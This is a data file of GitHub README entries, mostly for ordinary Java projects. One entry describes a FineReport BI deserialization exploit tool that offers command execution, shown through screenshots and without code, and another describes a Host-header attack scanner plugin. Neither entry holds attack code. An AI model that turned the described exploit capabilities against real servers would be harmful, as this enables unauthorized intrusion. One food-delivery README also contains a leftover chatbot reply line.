3. Start up a RSPS client and [connect to the server](simulation-rsps/README.md#connect-to-server-via-client).
4. Start an [agent evaluation session](pvp-ml/README.md#evaluate-model-on-simulation) for the model.",0,0,1,
simasch/cqrs-meets-modern-java,main,"# CQRS Meets Modern Java

This project is used as an example for my
talk [CQRS meets modern Java](https://speakerdeck.com/simas/cqrs-meets-modern-java)

## Prerequisite: jOOQ Build

The CQRS project uses jOOQ and therefore the database model classes must be created with Maven.

Change into the cqrs directory and run:

    ./mvnw compile

## Running the applications

Both applications use Testcontainers support of Spring Boot. Run the TestCqrsApplication and the
TestTraditionalApplication in src/test

## Testing

The file requests.http contains the http test requests to test the endpoints.",0,0,2,
Missuo0o/FoodDeliveryBackend,main,"# Food Delivery Backend System

This is the backend system for a food delivery application, built using Spring Boot. The application leverages a range of technologies including MySQL, Redis, RabbitMQ, and integrates with Alibaba Cloud's OSS and WeChat Pay. This system is designed to be scalable, secure, and efficient, utilizing Spring Boot's extensive support for enterprise-grade applications.

## Configuration

The application is configured to run on port 8080 and is set up with production profiles. It uses MyBatis for ORM, JWT for authentication, and includes advanced logging configurations.

### Technologies Used

- **Spring Boot** - Framework for building Java-based applications.
- **MySQL** - Database for storing user and order data.
- **Redis** - Used as a cache and session store.
- **RabbitMQ** - Messaging broker for handling asynchronous processing.
- **JWT** - For securing REST APIs by providing tokens to verify user identity.
- **MyBatis** - Persistence framework integrating with Spring Boot for data handling.
- **Knife4j** - Enhanced Swagger-compatible interface for visualizing RESTful APIs.
- **Alibaba Cloud OSS** - For storage solutions.
- **WeChat Pay** - Payment integration for handling transactions and refunds.

## Installation

### Prerequisites

You need the following installed on your system:

- Java JDK 23
- Maven
- MySQL
- RabbitMQ
- Redis

### Setup

1. Clone the repository:

   ```bash
   git clone https://github.com/yourusername/food-delivery-backend.git
   ```

2. Navigate to the project directory:

   ```bash
   cd food-delivery-backend
   ```

3. Install dependencies:

   ```bash
   mvn install
   ```

### Configuration

Update the `application.yml` or `application.properties` with your specific settings for MySQL, Redis, RabbitMQ, OSS, and WeChat Pay. This typically includes hosts, ports, usernames, passwords, and other essential configuration details.

Certainly! Here's the section of the README updated to reflect how to run the application using the `java -jar` command instead of Maven directly:

---

## Running the Application

Instead of using Maven to run the application, you can build a jar file and run it directly using the Java command. This is often more suitable for production environments or when deploying the application.

1. First, package the application into a runnable jar file with Maven:

   ```bash
   mvn clean package
   ```

   This command will create a `.jar` file in the `target` directory.

2. Run the application using:

   ```bash
   java -jar target/your-application-name.jar
   ```

   Replace `your-application-name.jar` with the actual name of your jar file generated by Maven.

The application will start running on `http://localhost:8080`.

---

## API Documentation

API documentation is available via Swagger UI and Knife4j at:

- **Swagger UI**: [http://localhost:8080/swagger-ui.html](http://localhost:8080/swagger-ui.html)
- **Knife4j**: [http://localhost:8080/doc.html](http://localhost:8080/doc.html)

## Security

This application uses JWT for authentication. Ensure you configure your JWT settings properly, including secret keys and token names for both admin and user levels.

## Contributing

We appreciate contributions. Please follow the standard GitHub fork-and-pull-request workflow.

## License

This project is licensed under the MIT License - see the LICENSE.md file for details.

---

This README includes detailed instructions for setting up and running your application, along with configuration management practices, to ensure smooth deployment and operation. Adjustments may be necessary to fit your exact setup or additional features.



",0,0,1,MIT
7wkajk/Frchannel,master,"# 帆软bi反序列漏洞利用工具
**加了几个新的反序列化利用链、有空更新上来。。**

支持jackson、hibernate、cb反序列化链来进行利用
![image](https://github.com/7wkajk/Frchannel/assets/76613407/b1caba86-2220-4827-9311-6f1b5573a913)
## 工具使用
**dnslog功能**
![image](https://github.com/7wkajk/Frchannel/assets/76613407/cbfa16a5-422c-4f03-9d61-a52c504bee29)
![image](https://github.com/7wkajk/Frchannel/assets/76613407/a3dabd83-4893-4ad6-a4c4-858cde5c3d1e)

**命令执行回显**
![image](https://github.com/7wkajk/Frchannel/assets/76613407/35bdd7e3-d21c-46c7-9a9e-a2809988ad7a)

## 免责声明
该工具仅用于安全自查检测

由于传播、利用此工具所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。

本人拥有对此工具的修改和解释权。未经网络安全部门及相关部门允许，不得善自使用本工具进行任何攻击活动，不得以任何方式将其用于商业目的。

该工具只授权于企业内部进行问题排查，请勿用于非法用途，请遵守网络安全法，否则后果作者概不负责

如有涉及公司与个人敏感信息，侵权烦请告知，我们会立即删除并致歉。谢谢！所有工具安全性自测！！！
",1,1,1,
ProgrammerLMS/mini-git,master,"目录

- [mini-git：用Java实现一个简易版Git](#mini-git用java实现一个简易版git)
  - [0. 介绍与说明](#0-介绍与说明)
  - [1. 内部数据结构](#1-内部数据结构)
    - [1.1 blob](#11-blob)
    - [1.2 tree](#12-tree)
    - [1.3 commit](#13-commit)
    - [1.4 stage](#14-stage)
  - [2. 支持的指令](#2-支持的指令)
    - [2.1 init](#21-init)
    - [2.2 add](#22-add)
    - [2.3 commit](#23-commit)
    - [2.4 status](#24-status)
    - [2.5 log](#25-log)
    - [2.6 rm](#26-rm)
    - [2.7 branch](#27-branch)
    - [2.8 checkout](#28-checkout)
  - [3. 额外功能](#3-额外功能)
  - [4. 文件目录](#4-文件目录)
  - [5. 运行截图](#5-运行截图)
# mini-git：用Java实现一个简易版Git

特此鸣谢`UCB`提供的`skeleton code`！

![](image/icon.png)

## 0. 介绍与说明

本玩具项目基于作者对`Git`的理解与`Git`操作，基本实现了`Git`部分指令的底层运行原理。在技术上只使用到了`Java 8 `官方库，包括序列化、文件、集合等，适合对`Git`或`Java`基础不够熟悉的计算机新手进行源码阅读或调试。

本系统已实现的指令在下方，由于代码量小及水平有限，部分命令和`Git`软件的真实使用效果并不相同，并对一些复杂指令作出简化，请阅读下方指令的**注意事项**，避免运行中由于人工误操作出现Bug。

同时，该系统不能完全代表`Git`内部真正的工作流程，**仅仅代表**本人理解与对`Git`实操的认识，借此抛砖引玉。（另外安利一个可视化学习`Git`的网站，[Learn Git Branching](https://learngitbranching.js.org/?locale=zh_CN)

## 1. 内部数据结构

### 1.1 blob

存在于`.git/object`文件夹，`blob`表示保存的文件内容。由于 `Git `会保存多个版本的文件，因此一个文件可能对应多个 `blob`：每个 `blob `在不同的`commit`中被跟踪。

### 1.2 tree

存在于`.git/object`文件夹，`tree`表示文件目录，即将名称映射为 `blob` 和其他子`tree`（子目录）引用的目录结构。在本项目中为了简化，没有包含实际的`tree`对象，而是直接通过文件路径。具体原理可见：[Git基础 — 16、Tree对象详解 - 繁华似锦Fighting - 博客园 ](https://www.cnblogs.com/liuyuelinfighting/p/16194504.html)

### 1.3 commit

存在于`.git/object`文件夹。`commit`包含了日志信息、元数据（提交日期、作者等）、对`tree`对象的引用以及对父`commit`的引用等。同时`Git`还会维护从分支头部到提交引用的映射。

### 1.4 stage

暂存区，对应`.git`中的`index`文件，在本项目中，`stage`包含了**新增文件暂存区**和**删除文件暂存区**。在下文中，我们称之为“**暂存-新增区**”与“**暂存-删除区**”。

## 2. 支持的指令

### 2.1 init

指令

- ##### `git init`

说明

- 该指令会在当前目录下创建一个新的 `mini-git` 版本控制系统。该系统将自动从一个`commit`开始：并且该提交不包含任何文件。初始状态下只有一个默认当前分支：`master`。由于 `mini-git`创建的所有版本库的初始提交内容完全相同，因此所有版本库都会自动共享该`commit`（它们都有相同的 `UID`），所有版本库中的所有`commit`都会追溯到该次提交。

### 2.2 add

指令

- ##### `git add .`

- ##### `git add [file/folder] [file/folder] ...`

说明

- 将当前存在的文件副本添加到暂存区。因此，被添加文件也称为暂存文件。重新暂存已暂存的文件会用新内容覆盖暂存区域中的前一个条目。如果文件的当前工作版本与当前提交的版本相同，则不要将其添加到暂存区；如果文件已经在暂存区，则应将其从暂存区移除（这可能发生在文件被修改、添加，然后又改回原始版本的情况下）。如果该文件在执行`git rm`命令时已在暂存区，则不会再被暂存。
- 具体原理同上。

注意事项

- 其中，`folder`为工作目录下的相对路径，如`git add a/b.txt`，如果你的路径包含空格，请加入**双引号**，如`git add ""a b""`，表示名为`a b`的文件夹。由于本系统无`vim`编辑模式，**请不要只输入一个引号**。

### 2.3 commit

指令

- ##### `git commit -m [message]`

说明

- 该操作会保存当前`commit`和暂存-新增区中跟踪文件的快照，并创建一个新的`commit`,新的`commit`的父`commit`为当前`commit`。在默认情况下，每个`commit`的文件快照与其父`commit`的文件快照完全相同；它将保持文件版本的原样。新`commit`只会更新已经被添加到暂存-新增区的文件，在这种情况下，新`commit`将包含在暂存区的文件版本，而不是从父`commit`中获得的版本。同时，新`commit`将保存并开始跟踪任何父`commit`没有跟踪的文件。最后，在当前`commit`中被跟踪的文件可能会在新`commit`中被取消跟踪，因为这些文件已被 `rm `命令删除。


### 2.4 status

指令

- ##### `git status`

说明

- 表示当前工作目录的状态，包含的内容信息如下：

  ```markdown
  === Staged Files ===
  
    
  === Removed Files ===
  
    
  === Modifications Not Staged For Commit ===
  
    
  === Untracked Files ===
  
  ```

### 2.5 log

指令

- ##### `git log`

- ##### `git log -[number]`

- ##### `git log --grep=[message]`

说明

- 按时间先后，展示所有`commit`记录
- 展示给定数量的`commit`记录
- 展示包含`message`信息的`commit`记录

### 2.6 rm

指令

- ##### `git rm [file/folder] [file/folder] ...`

- ##### `git rm -f [file/folder] [file/folder] ...`

- ##### `git rm -cached [file/folder] [file/folder] ...`

说明

- 从暂存区和工作目录，删除文件或文件夹
- 强制删除
- 只删除暂存区的文件或文件夹，保留工作目录的文件或文件夹

### 2.7 branch

指令

- ##### `git branch`

- ##### `git branch [branch name]`

- ##### `git branch -d [branch name]`

说明

- 查看当前所有本地分支

- 创建分支

- 删除分支

### 2.8 checkout

指令

- ##### `git checkout [branch name]`

- ##### `git checkout -b [branch name]`

- ##### `git checkout -- [file] [file] ...`

- ##### `git checkout [commit id] -- [file] [file] ...`

说明

- 所有文件切换到给定分支
- 创建分支，并切换到该分支
- 使用当前`head commit`的文件版本覆写该文件
- 根据指定commit的文件版本覆写该文件

## 3. 额外功能

- 支持`git [command] -h`查看指令帮助
- 支持八位`commit id`检索，如`d2ee103f`
- 系统会缓存上一次最近打开的工作目录
- 系统会缓存指令，通过键盘上的`↑`与`↓`按键，即可切换指令

## 4. 文件目录

```
├─src
    │  Main.java
    │
    ├─command
    │      AddCommand.java
    │      BranchCommand.java
    │      CheckoutCommand.java
    │      CommitCommand.java
    │      ICommand.java
    │      InitCommand.java
    │      LogCommand.java
    │      MergeCommand.java
    │      ResetCommand.java
    │      RmCommand.java
    │      StatusCommand.java
    │
    ├─engine
    │      Engine.java
    │      Repository.java
    │
    ├─object
    │      Blob.java
    │      Commit.java
    │      Stage.java
    │
    ├─utils
    │      FileTreeUtils.java
    │      PersistanceUtils.java
    │
    └─view
            CommandPromptGUI.java
            ViewResponseEntity.java
            ViewResponseEnum.java
```

## 5. 运行截图

![](image/running.png)

如有疑问，欢迎`emali`至programmerlms@163.com；如有`bug`，那是正常的:)",0,1,1,
wisp-forest/accessories,1.21.x,"<h1 align=""center"">
  <img src=""https://cdn.modrinth.com/data/jtmvUHXj/14fabf4859e845b0bd6659daf2375be3e88f59ec.png"" width=230>
  <br>
  αccessories
  <br>
  <a href=""https://modrinth.com/mod/accessories/"">
      <img src=""https://img.shields.io/badge/-modrinth-gray?style=for-the-badge&labelColor=green&labelWidth=15&logo=appveyor&logoColor=white"">
  </a>
  <a href=""https://www.curseforge.com/minecraft/mc-mods/accessories"">
      <img src=""https://img.shields.io/badge/-curseforge-gray?style=for-the-badge&labelColor=orange&labelWidth=15&logo=appveyor&logoColor=white"">
  </a>
  <br>
  <a href=""https://maven.wispforest.io/#/releases/io/wispforest/accessories-fabric"">
    <img alt=""Maven metadata URL"" src=""https://img.shields.io/maven-metadata/v?metadataUrl=https%3A%2F%2Fmaven.wispforest.io%2Freleases%2Fio%2Fwispforest%2Faccessories-fabric%2Fmaven-metadata.xml&style=for-the-badge"">
  </a>
  <a href=""https://discord.gg/xrwHKktV2d"">
      <img src=""https://img.shields.io/discord/825828008644313089?label=wisp%20forest&logo=discord&logoColor=white&style=for-the-badge"">
  </a>
  <a href=""https://docs.wispforest.io/accessories/home/"">
    <img src=""https://img.shields.io/badge/Documentation-Link-SECRET_MESSAGE?link=https%3A%2F%2Fdocs.wispforest.io%2Faccessories%2Fhome%2F&logo=discord&logoColor=white&style=for-the-badge"">
  </a>
</h1>

## Overview
Accessories is a Data-Driven Accessory mod for NeoForge and Fabric with emphasis on using a Common API for both platforms when possible

<p/>
  
This API is based on the works of [Curios](https://github.com/TheIllusiveC4/Curios) and [Trinkets](https://github.com/emilyploszaj/trinkets) with credit going to both [TheIllusiveC4](https://github.com/TheIllusiveC4) and [emilyploszaj](https://github.com/emilyploszaj) for their work on Accessory mods for Minecraft.

<p align=""center"">
  <img width=600 src=""https://cdn.modrinth.com/data/jtmvUHXj/images/e40c711b48f2962a31f808c34792ba4f71978ca3.png""/>
</p>

## Build Setup

Below is an example of various dependencies setups for platforms with the given repositories are all required for all accessories dependencies.

### Groovy
```groovy
repositories {
    maven { url 'https://maven.wispforest.io/releases' }
    maven { url 'https://maven.su5ed.dev/releases' }
    maven { url 'https://maven.fabricmc.net' }
    maven { url 'https://maven.shedaniel.me/' }
}

// Fabric
dependencies {
    modImplementation(""io.wispforest:accessories-fabric:${project.accessories_version}"")
}
//...

// Arch Common
dependencies {
    modImplementation(""io.wispforest:accessories-common:${project.accessories_version}"")
}
//...

// Arch NeoForge
dependencies {
    modImplementation(""io.wispforest:accessories-neoforge:${project.accessories_version}"")

    // Required due to issues with JIJ dependency resolving in arch or something
    forgeRuntimeLibrary(""io.wispforest:endec:0.1.8"")
    forgeRuntimeLibrary(""io.wispforest.endec:gson:0.1.5"")
    forgeRuntimeLibrary(""io.wispforest.endec:netty:0.1.4"")
}
//...

// NeoForge
dependencies {
    implementation(""io.wispforest:accessories-neoforge:${project.accessories_version}"")
}
//...

// Vanilla Gradle Common
dependencies {
    // Yarn Intermediary 
    compileOnly(""io.wispforest:accessories-common:${project.accessories_version}"")
    
    // Mojang Mappings
    compileOnly(""io.wispforest:accessories-common:${project.accessories_version}-mojmap"")
}
```
<details>
<summary><h3>Kotlin DSL</h3></summary>
  
```kotlin
repositories {
    maven(""https://maven.wispforest.io/releases"")
    maven(""https://maven.su5ed.dev/releases"")
    maven(""https://maven.fabricmc.net"")
    maven(""https://maven.shedaniel.me/"")
}

// Fabric
dependencies {
    modImplementation(""io.wispforest:accessories-fabric:${properties[""accessories_version""]}"")
}
//...

// Arch Common
dependencies {
    modImplementation(""io.wispforest:accessories-common:${properties[""accessories_version""]}"")
}
//...

// Arch NeoForge
dependencies {
    modImplementation(""io.wispforest:accessories-neoforge:${properties[""accessories_version""]}"")

    // Required due to issues with JIJ dependency resolving in arch or something
    forgeRuntimeLibrary(""io.wispforest:endec:0.1.8"")
    forgeRuntimeLibrary(""io.wispforest.endec:gson:0.1.5"")
    forgeRuntimeLibrary(""io.wispforest.endec:netty:0.1.4"")
}
//...

// NeoForge
dependencies {
    implementation(""io.wispforest:accessories-neoforge:${properties[""accessories_version""]}"")
}
//...

// Vanilla Gradle Common
dependencies {
    // Yarn Intermediary 
    compileOnly(""io.wispforest:accessories-common:${properties[""accessories_version""]}"")

    // Mojang Mappings
    compileOnly(""io.wispforest:accessories-common:${properties[""accessories_version""]}-mojmap"")
}
```
</details>

## Features
- Compatibility Layers with existing Accessory Mods like [Curios](https://github.com/TheIllusiveC4/Curios) and [Trinkets](https://github.com/emilyploszaj/trinkets)
- Full Support for NBT-based Accessories (More Info on Wiki {TODO: ADD LINK TO WIKI})
- Existing API Events for Piglin Neutral Items, Enderman Masks, Looting Adjustments, Fortune Adjustments, and Snow Walking Ability.
- Unique Slot API for Mod Specific Accessories (More Info on Wiki {TODO: ADD LINK TO WIKI})
",6,13,4,NOASSERTION
hy0jer/HostScan,main,"## 前言

该BP插件是在工作之余编写出来的，设计初衷是实现对host头攻击的全自动检测，这是作者第一次尝试编写bp插件，可以说是个Demo项目，如果有任何使用问题或者其他好的idea，可提交issues 

## 简介

该插件支持对host头攻击的全自动检测和主动扫描

#注意该BP插件使用MontoyaApi编写，不兼容旧版burp suite

## 安装流程

在burp suite的Extensions选项页面添加HostScan插件

![install](./images/install.png)

正常安装完毕后是如下页面显示

![install1](./images/install1.png)

![install2](./images/show.png)

### 使用说明

该插件支持两种运行方式，手动选择进行扫描以及自动扫描

### 自动扫描

安装后该插件初始状态默认设置自动扫描，即经过burp suite的流量都会进行扫描，如果检测到存在host头攻击会在Target选项页面以及HostScan插件详情页面显示具体情况，如下图所示

![78170bb6529f16e2d29c42e764c5142](./images/78170bb6529f16e2d29c42e764c5142.png)

![a5fff58bf98e935270f22d19e2dce85](./images/a5fff58bf98e935270f22d19e2dce85.png)



如果不想使用自动扫描，可点击该框关闭，如下所示

![operate](./images/operate.png)

![show](./images/install2.png)

### 主动扫描

右键选择需要检测的请求包通过extensions选项进行扫描

![ceaab9b923e2758cb57e885d6d1b500](./images/ceaab9b923e2758cb57e885d6d1b500.png)

如果检测出安全问题，会在详情页面显示

![b2a7c9ad2138e025550f49b9dd0377d](./images/b2a7c9ad2138e025550f49b9dd0377d.png)
",1,1,1,MIT
lhccong/short-link-dog-backend,master,"# ShortLinkDog🐕 - 你的友好短链生成系统

ShortLinkDog是一个简单高效的URL缩短系统，旨在帮助你将长URL缩短为易于分享的简洁链接。使用ShortLinkDog，你可以使URL更加用户友好，并轻松管理你的链接。

## 特性

- 将长URL缩短为简洁、易记的链接。
- 可自定义链接别名，用于品牌和组织。
- 提供详细的链接分析功能，跟踪链接性能。
- 提供易于使用的Web界面和API供集成使用。
- 安全且可扩展的架构。

## 开始使用

### 先决条件

- Java 8或更高版本。
- Redis。
- Spring Boot。
- MySQL或其他兼容的数据库。

### 安装

1. 克隆这个仓库。
2. 在`application.properties`中配置数据库设置。
3. 使用Maven或你喜欢的构建工具构建项目。
4. 运行应用程序。

## 使用方法

- 访问`http://localhost:8101`的Web界面以缩短URL。
- 使用API以编程方式创建和管理短链接。

## API文档

有关API文档和使用示例，请参阅[API文档](api-docs.md)。

## 贡献

我们欢迎社区的贡献。如果你想要贡献，请查看我们的[贡献指南](CONTRIBUTING.md)。

## 许可证

本项目根据MIT许可证授权 - 请参阅[LICENSE](LICENSE)文件以获取详细信息。

## 鸣谢

ShortLinkDog受到对简单而有效的URL缩短的需求启发而创建。我们感谢开源社区的贡献和支持。

愿你使用ShortLinkDog愉快！
",0,0,1,
jithrew/PantryMate,main,"# PantryMate
 
 PantryMate is an application designed for efficient and user-friendly management of household pantries, aimed at reducing food waste and improving organization.

## Tech Stack
- **[Java](https://www.java.com/en/)** - Programming Language
- **[SQLite](https://www.sqlite.org/index.html)** - Database

## Installation
1. Clone the repository:
   ```bash
   git clone https://github.com/jithrew/PantryMate-SE.git
2. Open the cloned folder in Visual Studio Code.
3. Run the application using Java.

 ## Authors
- Fajardo, Walley
- Quiday, Elisha Joash
- Sta. Ana, Jethro
- Suzon, Baron David
",0,0,1,
seregamorph/spring-test-smart-context,master,"## Improving Spring Boot Test efficiency

### Problem statement
Spring test framework creates an application context according to test class configuration.
The context is cached and reused for all subsequent tests. If there is an existing context
with the same configuration, it will be reused. Otherwise, the new context will be created.
This is a very efficient and flexible approach, but it has a drawback: eventually this may
lead to out of memory errors if the number of unique configurations is too high and context
has a lot of heavyweight beans like TestContainers. In many cases simple static bean 
definition can help, but this project suggests another approach: reordering test classes
and eager context cleanup.

Consider a sample test suite of 8 classes that use 4 different configurations, classes that have the same configuration
are marked with the same colour:

<img src=""doc/sample-test-suite.png"" alt=""Sample test suite"" width=""700""/>

In a large test suites as well as in shared CI/CD environments with lots of test pipelines
working simultaneously this may eventually lead to out of memory errors
in Java process or Docker host.

### Proposed solution
It's recommended to use statically-defined TestContainers beans, optimize reusing same configuration between tests 
e.g. via common test super-classes.
But additionally this library makes two optimizations:
* test class execution is reordered to group tests with the same context configuration so they
can be executed sequentially
* the order of tests is known, so if current test class is last per current configuration, the spring context
will be automatically closed (it's called `Smart DirtiesContext`) and the beans will be disposed releasing resources

As a result, in a suite of single module there will always be not more than 1 active spring contexts:

<img src=""doc/reorder-and-smart-dirties-context.png"" alt=""Reordered suite with smart DirtiesContext"" width=""700""/>

This chart is done via calculating the number of active docker containers while executing a suite of 120 integration
test classes that actively uses TestContainers for databases (several datasources simultaneously) and other services:

<img src=""doc/active-docker-containers.png"" alt=""Number of active docker containers"" width=""700""/>

As shown on the chart, the suite just fails with OOM without the optimization.
As an advantage, the total test execution time will also become less, because resource consumption (especially memory)
will be reduced, hence tests are executed faster.

### References
This idea was submitted to the Spring Framework team as a feature request:
* https://github.com/spring-projects/spring-framework/issues/32289

Public presentation with AtomicJar (TestContainers creators):
* https://www.youtube.com/watch?v=_Vci_5nr8R0

### Limitations
At the moment only single thread test execution per module is supported. Parallel test execution is work in progress.
Also there can be problems with Jupiter
[Nested](https://junit.org/junit5/docs/current/user-guide/#writing-tests-nested) test classes.

### Supported versions
`Java` 8+ (`Java` 17+ for spring-boot 3.x projects)

`Spring Boot` 2.4+, 3.x as well as bare Spring framework

Supported test frameworks:
* `JUnit 4` (via JUnit 5 [junit-vintage-engine](https://junit.org/junit5/docs/current/user-guide/#migrating-from-junit4-running))
* `JUnit 5 Jupiter`
* `TestNG` (both bare TestNG and JUnit platform [testng-engine](https://github.com/junit-team/testng-engine))

`Gradle Enterprise Maven Extension` (test execution caching) correctly supports changed behaviour

### How to use
Add maven dependency (available in maven central):
```xml
<dependency>
    <groupId>com.github.seregamorph</groupId>
    <artifactId>spring-test-smart-context</artifactId>
    <version>0.3</version>
    <scope>test</scope>
</dependency>
```
Or Gradle dependency:
```groovy
testImplementation(""com.github.seregamorph:spring-test-smart-context:0.3"")
```
It's recommended to check [Demo projects](demo).

### How it works

<details>
  <summary>JUnit 5 Jupiter</summary>

Add the dependency to the library in test scope, it will automatically setup
[SmartDirtiesClassOrderer](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/jupiter/SmartDirtiesClassOrderer.java)
which will reorder test classes on each execution and prepare the list of last test class per context configuration.
Then this test execution listener
[SmartDirtiesContextTestExecutionListener](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/SmartDirtiesContextTestExecutionListener.java)
will be auto-discovered via [spring.factories](spring-test-smart-context/src/main/resources/META-INF/spring.factories).
Alternatively it can be defined explicitly
```java
@TestExecutionListeners(SmartDirtiesContextTestExecutionListener.class)
```
or even inherited from
[AbstractJUnitSpringIntegrationTest](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/jupiter/AbstractJUnitSpringIntegrationTest.java)
</details>

<details>
  <summary>TestNG</summary>

Add the dependency to the library in test scope, it will automatically setup
[SmartDirtiesSuiteListener](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/testng/SmartDirtiesSuiteListener.java)
which will reorder test classes on each execution and prepare the list of last test class per context configuration.
The integration test classes should add
[SmartDirtiesContextTestExecutionListener](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/SmartDirtiesContextTestExecutionListener.java)
```java
@TestExecutionListeners(SmartDirtiesContextTestExecutionListener.class)
```
Note: the annotation is inherited, so it makes sense to annotate the base test class or use
[AbstractTestNGSpringIntegrationTest](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/testng/AbstractTestNGSpringIntegrationTest.java)
parent.
</details>

<details>
  <summary>JUnit 4</summary>

Note: support of JUnit 4 is planned to be removed in version 1.0 (will stay available in 0.x versions).

The JUnit 4 does not provide standard way to reorder test class execution, but it's still possible via
[junit-vintage-engine](https://junit.org/junit5/docs/current/user-guide/#migrating-from-junit4-running).
This dependency should be added to test scope of the module:
```xml
<dependency>
    <groupId>org.junit.vintage</groupId>
    <artifactId>junit-vintage-engine</artifactId>
    <scope>test</scope>
</dependency>
```
or for Gradle (see [detailed instruction](https://docs.gradle.org/current/userguide/java_testing.html#executing_legacy_tests_with_junit_vintage)):
```groovy
testRuntimeOnly('org.junit.vintage:junit-vintage-engine')
testRuntimeOnly('org.junit.platform:junit-platform-launcher')
```
Also the `surefire`/`failsafe` plugins should be configured to use junit-platform:
```xml
<plugin>
    <groupId>org.apache.maven.plugins</groupId>
    <artifactId>maven-surefire-plugin</artifactId>
    <version>${maven-surefire.version}</version>
    <dependencies>
        <dependency>
            <groupId>org.apache.maven.surefire</groupId>
            <artifactId>surefire-junit-platform</artifactId>
            <version>${maven-surefire.version}</version>
        </dependency>
    </dependencies>
</plugin>
<plugin>
    <groupId>org.apache.maven.plugins</groupId>
    <artifactId>maven-failsafe-plugin</artifactId>
    <version>${maven-surefire.version}</version>
    <dependencies>
        <dependency>
            <groupId>org.apache.maven.surefire</groupId>
            <artifactId>surefire-junit-platform</artifactId>
            <version>${maven-surefire.version}</version>
        </dependency>
    </dependencies>
</plugin>
```
or for Gradle:
```groovy
tasks.named('test', Test) {
    useJUnitPlatform()
}
```

For projects with JUnit 4 it will automatically setup
[SmartDirtiesPostDiscoveryFilter](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/SmartDirtiesPostDiscoveryFilter.java)
which will reorder test classes on the level of junit-launcher and prepare the list of last test class per context configuration.
Then this test execution listener
[SmartDirtiesContextTestExecutionListener](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/SmartDirtiesContextTestExecutionListener.java)
will be auto-discovered via [spring.factories](spring-test-smart-context/src/main/resources/META-INF/spring.factories).
Alternatively it can be defined explicitly
```java
@TestExecutionListeners(SmartDirtiesContextTestExecutionListener.class)
```
or even inherited from
[AbstractJUnit4SpringIntegrationTest](spring-test-smart-context/src/main/java/com/github/seregamorph/testsmartcontext/junit4/AbstractJUnit4SpringIntegrationTest.java)
</details>

### Additional materials
* See the online presentation of the project https://www.youtube.com/watch?v=_Vci_5nr8R0 hosted by 
[AtomicJar](https://www.atomicjar.com/), the creators of [TestContainers](https://testcontainers.com/) framework.
* Presentation slides: [Miro board](https://miro.com/app/board/uXjVN3KJeCI=/?share_link_id=309027962805)

### Known projects using library
<img src=""doc/miro-logo.png"" alt=""Miro"" width=""120""/>

[Miro](https://miro.com/) is using this approach to optimize huge integration test suites and it saved a lot of resource
for CI/CD pipelines.
",3,0,3,Apache-2.0
LostZX/confluence-exp,master,,1,0,1,
zOnlyKroks/P2P,1.20.4,,0,1,9,MIT
mitre-public/open-aria,main,"
![aria logo picture](./docs/assets/DFW-Airspace-Graph.gif)

[![Java CI with Gradle](https://github.com/mitre-public/open-aria/actions/workflows/gradle.yml/badge.svg)](https://github.com/mitre-public/open-aria/actions/workflows/gradle.yml)
[![License](https://img.shields.io/:license-apache-brightgreen.svg)](http://www.apache.org/licenses/LICENSE-2.0.html)

# Welcome to OpenARIA

This repository contains an open-source edition of the _Aviation Risk Identification and Assessment_ (ARIA) software
program developed by MITRE on behalf of the Federal Aviation Administration's (FAA) Safety and Technical Training (AJI)
Service Unit.

## OpenARIA's Goal

Our goal is to build a community focused on improving aviation safety & efficiency by extracting value from aircraft
location data.

## How OpenARIA can achieve this Goal

1. Provide a publicly available solution for **detecting aviation risks** within aircraft location data.
    - This tangible working solution can be critiqued by the community and improved as necessary.


2. Provide a publicly available solution for detecting **and then aggregating** aviation risks for bulk
   analysis.
    - Someone operating `OpenARIA` for a day will have one day's worth of output
    - Someone operating `OpenARIA` for a year will have a year's worth of output.
    - We must facilitate capturing and utilizing large amounts of output data.


3. Provide a publicly available solution for **archiving and replaying** aircraft location data
    - E.g., when `OpenARIA` detects _an event_, we will want to be able to replay the event to understand what happened.


4. Provide solutions that work with near-real time data streams as well as archival data.

---

# Getting Started

- Learn about important ongoing work [here](./docs/ADRs/supportingNewFormats.md)
  and [here](./docs/ADRs/pointInterfaceCritique2.md)
- Learn about the supported data formats [here](./docs/csv-data-format.md)
    - **Important Caveat:** The initial code commit includes a dependency that is not available in the open source
      domain.
    - We are working to remove this blocker by:
        1. Proposing [this](./docs/csv-data-format.md) data format (which will replace the legacy format)
        2. Adding support for this new data format
        3. Refactoring the code so the closed-source dependency is no longer used or required.
        4. Building the project using **only** GitHub Actions and publicly available dependencies
    - You can view the progress of this work by browsing the branches of the project.
- To begin **detecting aviation events** see [here](./docs/how-to/detect-encounters.md)
- To begin **archiving and replaying** aircraft location data see [here](./docs/how-to/replay-encounters.md)
- To begin detecting **and then aggregating** aviation data see [here](./docs/how-to/aggregate-encounters.md)_

## Building from Source

1. First clone the project: `git clone git@github.com:mitre-public/open-aria.git`
2. Navigate to project directory `cd {PATH_TO_REPOSITORY}/open-aria`
3. Run: `./gradlew shadowJar`
    - This command launches a build plugin that collects all compiled code and dependencies into a single
      jar (aka _uber jar_, _shadow jar_, or _fat jar_)
4. Find the _uber jar_ in: 
    - `{PATH_TO_REPOSITORY}/open-aria/open-aria-deploy/libs/build`
    - The _uber jar_ will have a name like: `open-aria-0.1.0-SNAPSHOT-uber.jar`

## Downloading Pre-Built Artifact
There are 2 places to simply download a pre-built artifact
1. Download a full release from [here](https://github.com/mitre-public/open-aria/releases)
   - **Coming soon** (ETA = June 1st)
2. Download the artifact produced during a recent execution of the CI/CD system.
   - Click [here](https://github.com/mitre-public/open-aria/actions/workflows/gradle.yml) to see the list of recent builds
   - Click on any build from the last 90 days (GitHub stores build artifacts for 90-days)
   - Download the Artifact named: `Deployable-Uber-Jar`

- [ ] TODO: Publish full releases to Maven Central.

---

# Documentation

- [High-level source code summary](docs/codeIntro.md)


- **About ARIA's Airborne Event Data**
    - An example of this JSON output data is [here](open-aria-airborne/src/test/resources/scaryTrackOutput.json)
    - A PDF describing the output data is [here](open-aria-airborne/airborneDataSpec_v3.pdf)


- **Architectural Decision Records (ADRs)**
    - [Supporting New Data Formats](./docs/ADRs/supportingNewFormats.md)
